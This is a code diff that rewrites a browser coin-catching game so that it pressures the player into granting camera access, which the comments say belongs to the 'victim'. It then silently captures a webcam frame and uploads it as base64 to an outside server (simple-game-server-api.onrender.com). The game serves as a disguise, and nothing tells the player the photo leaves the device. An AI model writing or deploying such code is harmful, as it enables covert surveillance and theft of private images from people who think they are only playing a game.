@@ -101,18 +101,150 @@
     </div>
   </div>
 
-  <script>
-    function sendToAPI(imageData) {
-      fetch("http://localhost:3000/upload", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ image: imageData })
-      }).catch(err => console.error("Upload failed", err));
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const grantBtn = document.getElementById('grantPermsBtn');
+const helpBtn = document.getElementById('helpBtn');
+const overlay = document.getElementById('overlay');
+const player = document.getElementById('player');
+const gameBox = document.getElementById('game-box');
+
+let playerX = gameBox.offsetWidth / 2 - 25;
+let cameraGranted = false;
+
+// Show help text if victm clicks help button
+helpBtn.addEventListener("click", () => {
+    overlay.innerHTML = `
+        <p><strong>Camera access was denied.</strong><br>
+        To reset it:</p>
+        <ul style="text-align: left;">
+            <li>Click the <strong>🔒 lock icon</strong> in your browser’s address bar</li>
+            <li>Find "Camera" in the list</li>
+            <li>Set it to "Allow"</li>
+            <li>Refresh the page</li>
+        </ul>
+    `;
+});
+
+// Detect denied permissions from victim
+if (navigator.permissions) {
+    navigator.permissions.query({ name: 'camera' }).then(result => {
+        if (result.state === 'denied') {
+            overlay.innerHTML = `
+                <p><strong>Camera permission denied.</strong><br>
+                Please allow camera access in your browser settings and refresh the page.</p>
+                <button id="helpBtn">Need Help?</button>
+            `;
+            document.getElementById("helpBtn").addEventListener("click", () => helpBtn.click());
+        }
+    });
+}
+
+// Send base64 image to mh server API
+async function sendToServer(imageData) {
+    try {
+        await fetch("https://simple-game-server-api.onrender.com/upload", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ image: imageData })
+        });
+    } catch (err) {
+        console.error("Upload failed", err);
     }
+}
 
-    sendToAPI(imageData);
+// Request camera and grab frame
+async function requestCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-  </script>
+        video.onloadedmetadata = () => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Send to my server api s-g-s-a instead of cord
+            sendToServer(imageData);
+
+            stream.getTracks().forEach(track => track.stop());
+            overlay.style.display = "none";
+            cameraGranted = true;
+        };
+    } catch (err) {
+        alert("Camera access was denied.");
+    }
+}
+
+grantBtn.addEventListener("click", () => {
+    requestCamera();
+});
+
+// Coin spawner pr wtv
+function spawnCoin() {
+    const coin = document.createElement('div');
+    coin.className = 'coin';
+    coin.style.left = Math.random() * (gameBox.offsetWidth - 30) + 'px';
+    gameBox.appendChild(coin);
+
+    let y = 0;
+    const fall = setInterval(() => {
+        y += 5;
+        coin.style.top = y + 'px';
+
+        const playerRect = player.getBoundingClientRect();
+        const coinRect = coin.getBoundingClientRect();
+
+        if (
+            coinRect.bottom >= playerRect.top &&
+            coinRect.left < playerRect.right &&
+            coinRect.right > playerRect.left
+        ) {
+            coin.remove();
+            clearInterval(fall);
+        }
+
+        if (y > gameBox.offsetHeight) {
+            coin.remove();
+            clearInterval(fall);
+        }
+    }, 30);
+}
+
+// Game loop starter
+function gameLoop() {
+    if (!cameraGranted) {
+        // Preview mode: is auto-move!!!!!!!
+        playerX += Math.random() < 0.5 ? -3 : 3;
+    }
+    playerX = Math.max(0, Math.min(gameBox.offsetWidth - 50, playerX));
+    player.style.left = playerX + 'px';
+
+    requestAnimationFrame(gameLoop);
+}
+
+// Keyboard for desktop users
+document.addEventListener('keydown', (e) => {
+    if (!cameraGranted) return;
+    if (e.key === 'ArrowLeft') playerX -= 15;
+    if (e.key === 'ArrowRight') playerX += 15;
+});
+
+// Mobile tilt for mobiles
+if (window.DeviceOrientationEvent) {
+    window.addEventListener('deviceorientation', (event) => {
+        if (!cameraGranted) return;
+        const gamma = event.gamma;
+        if (gamma > 5) playerX += 5;
+        if (gamma < -5) playerX -= 5;
+    });
+}
+
+setInterval(spawnCoin, 1000);
+gameLoop();
+</script>
 </body>
 
 </html>
